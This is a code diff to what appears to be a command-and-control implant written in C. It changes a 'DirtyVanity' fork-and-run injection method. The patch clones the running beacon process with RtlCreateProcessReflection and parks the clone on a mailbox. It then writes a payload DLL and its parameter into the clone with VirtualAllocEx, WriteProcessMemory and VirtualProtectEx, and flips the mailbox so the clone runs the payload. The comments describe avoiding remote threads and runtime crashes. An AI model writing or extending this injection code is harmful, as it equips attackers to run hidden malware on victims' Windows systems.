@@ -237,67 +237,132 @@ BOOL procinj_execute_has(BYTE opcode) {
  * first thread runs it. Identical image to us, kernel-recorded start
  * address inside that image: the whole point of the technique. */
 typedef struct _T2_RTL_PROCESS_REFLECTION_INFORMATION {
-	void * UniqueProcess; /* CLIENT_ID */
+	void * ReflectionThreadHandle; /* phnt layout: thread handle first */
+	void * UniqueProcess;          /* CLIENT_ID */
 	void * UniqueThread;
-	void * ReflectionProcessHandle;
-	void * ReflectionThreadHandle;
 } T2_REFLECTION_INFORMATION;
 
 typedef NTSTATUS(NTAPI *fRtlCreateProcessReflection)(void *, unsigned long, void *, void *, void *, T2_REFLECTION_INFORMATION *);
 
-static BOOL dv_reflect_fired = FALSE;
+/* ---- fork&run nursery ------------------------------------------------
+ * A reflection clone of a beacon that has already run HTTP inherits the
+ * live wininet/RPC state; the payload beacon inside the clone dies with a
+ * fastfail in RPCRT4 on its first checkin (live, twice). Forking instead
+ * at beacon() boot - before any RPC-capable subsystem is touched - gives
+ * a pristine clone. The clone's initial thread parks on the mailbox (an
+ * inherited copy at the identical VA); the spawn path later writes the
+ * payload plus mailbox directly into the parked clone and it jumps. No
+ * remote threads, no inherited-runtime poisoning, identical image. */
+typedef struct {
+	volatile LONG go;
+	char * entry;
+	void * param;
+} DV_MAILBOX;
 
-BOOL inject_via_dirtyvanity_reflect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
+static DV_MAILBOX dv_mailbox = { 0, NULL, NULL };
+static DWORD dv_clone_pid = 0;
+
+void dv_nursery_trampoline(void * unused) {
+	(void)unused;
+	while (!dv_mailbox.go)
+		Sleep(200);
+	((void (*)(void *))dv_mailbox.entry)(dv_mailbox.param);
+	for (;;)
+		Sleep(60000);
+}
+
+void dv_nursery_init(void) {
 	fRtlCreateProcessReflection pReflect;
 	T2_REFLECTION_INFORMATION info;
-	NTSTATUS st;
 	HMODULE nt;
+	DWORD pid;
 
-	(void)lpParameter;
-
-	/* the fork clones the context's own process - only meaningful when the
-	 * pipeline targets us (the spawn-site contract) */
-	if (!context->samePid)
-		return FALSE;
+	if (dv_clone_pid != 0)
+		return;
+	if (!procinj_execute_has(PI_EXEC_DIRTYVANITY))
+		return; /* profile does not want fork&run */
 
 	nt = GetModuleHandleA("ntdll.dll");
 	if (nt == NULL)
-		return FALSE;
+		return;
 	pReflect = (fRtlCreateProcessReflection)GetProcAddress(nt, "RtlCreateProcessReflection");
 	if (pReflect == NULL)
-		return FALSE;
+		return;
 
+	/* flags: INHERIT_HANDLES | NO_SUSPEND (live matrix; see the flag notes
+	 * in git history - every NO_SYNCHRONIZE combo is rejected here) */
 	ZeroMemory(&info, sizeof(info));
-	/* flags: INHERIT_HANDLES | NO_SUSPEND. Live matrix on this build:
-	 * 0x2 succeeds but suspends the parent during the snapshot - resuming
-	 * a thread parked inside an RPC wait corrupts the runtime and the
-	 * parent fastfails in RPCRT4 right after (observed live). 0x6 skips
-	 * the parent suspension entirely. Every NO_SYNCHRONIZE (0x8) combo
-	 * returns 0xC00000F3 even with an event handle; 0x1/0x3 -> 0xC00000F0.
-	 * Struct per phnt: thread handle first, then the CLIENT_ID. */
-	st = pReflect(GetCurrentProcess(), 0x2 | 0x4, lpStartAddress, lpParameter, NULL, &info);
-	if (st != 0) {
-		spawn_log("dv: reflection failed st=", (long)st);
-		post_error_d(0x4a, (int)st);
-		return FALSE;
+	if (pReflect(GetCurrentProcess(), 0x2 | 0x4, dv_nursery_trampoline, NULL, NULL, &info) != 0) {
+		spawn_log("dv: nursery reflect failed", 0x7fffffff);
+		return;
 	}
 
-	spawn_log("dv: reflection fired, clone pid=", (long)(DWORD_PTR)info.UniqueProcess);
-	dv_reflect_fired = TRUE;
-	return TRUE;
+	pid = (DWORD)(DWORD_PTR)info.UniqueProcess;
+	if (pid == 0 || pid == GetCurrentProcessId()) {
+		spawn_log("dv: nursery layout mismatch?", (long)pid);
+		return;
+	}
+	dv_clone_pid = pid;
+	spawn_log("dv: nursery up, clone pid=", (long)pid);
 }
 
 BOOL inject_dirtyvanity_forkrun(char * dll, int dllen, char * parameter, int plen) {
 #if !defined _M_X64
 	return FALSE;
 #else
-	/* run the full pipeline against our own process: payload mirror,
-	 * profile transforms and the execute chain all apply; the chain's
-	 * DirtyVanity opcode (the same one that routed the spawn site here)
-	 * performs the fork&run trigger */
-	dv_reflect_fired = FALSE;
-	inject_process_logic(NULL, GetCurrentProcess(), GetCurrentProcessId(),
-	                     dll, dllen, 0, parameter, plen);
-	return dv_reflect_fired;
+	/* deliver the payload into the parked nursery clone: mirror the dll
+	 * RX, mirror the parameter RW, flip the mailbox. The trampoline jumps
+	 * to the payload entry (offset 0, the spawn convention). Profile
+	 * transforms are not applied on this path. One-shot: the clone runs
+	 * the payload beacon from here on. */
+	void * remote = NULL;
+	void * rparam = NULL;
+	SIZE_T got = 0;
+	DWORD oldp = 0;
+	HANDLE hc;
+	DV_MAILBOX mb;
+
+	if (dv_clone_pid == 0)
+		return FALSE;
+
+	hc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, dv_clone_pid);
+	if (hc == NULL) {
+		spawn_log("dv: OpenProcess clone failed gle=", (long)GetLastError());
+		return FALSE;
+	}
+
+	remote = VirtualAllocEx(hc, NULL, (SIZE_T)dllen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (remote == NULL || !WriteProcessMemory(hc, remote, dll, (SIZE_T)dllen, &got) || got != (SIZE_T)dllen) {
+		spawn_log("dv: payload write failed gle=", (long)GetLastError());
+		CloseHandle(hc);
+		return FALSE;
+	}
+	VirtualProtectEx(hc, remote, (SIZE_T)dllen, PAGE_EXECUTE_READ, &oldp);
+
+	if (plen > 0) {
+		rparam = VirtualAllocEx(hc, NULL, (SIZE_T)plen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		if (rparam == NULL || !WriteProcessMemory(hc, rparam, parameter, (SIZE_T)plen, &got) || got != (SIZE_T)plen) {
+			spawn_log("dv: param write failed gle=", (long)GetLastError());
+			CloseHandle(hc);
+			return FALSE;
+		}
+	}
+
+	mb.go    = 1;
+	mb.entry = (char *)remote;
+	mb.param = rparam;
+	/* dv_mailbox lives in our image - the clone's inherited copy sits at
+	 * the identical VA (fork preserves the address space) */
+	if (!WriteProcessMemory(hc, &dv_mailbox, &mb, sizeof(mb), &got) || got != sizeof(mb)) {
+		spawn_log("dv: mailbox write failed gle=", (long)GetLastError());
+		CloseHandle(hc);
+		return FALSE;
+	}
+
+	CloseHandle(hc);
+	spawn_log("dv: payload delivered to clone pid=", (long)dv_clone_pid);
+	dv_clone_pid = 0; /* one-shot */
+	return TRUE;
 #endif
 }
+
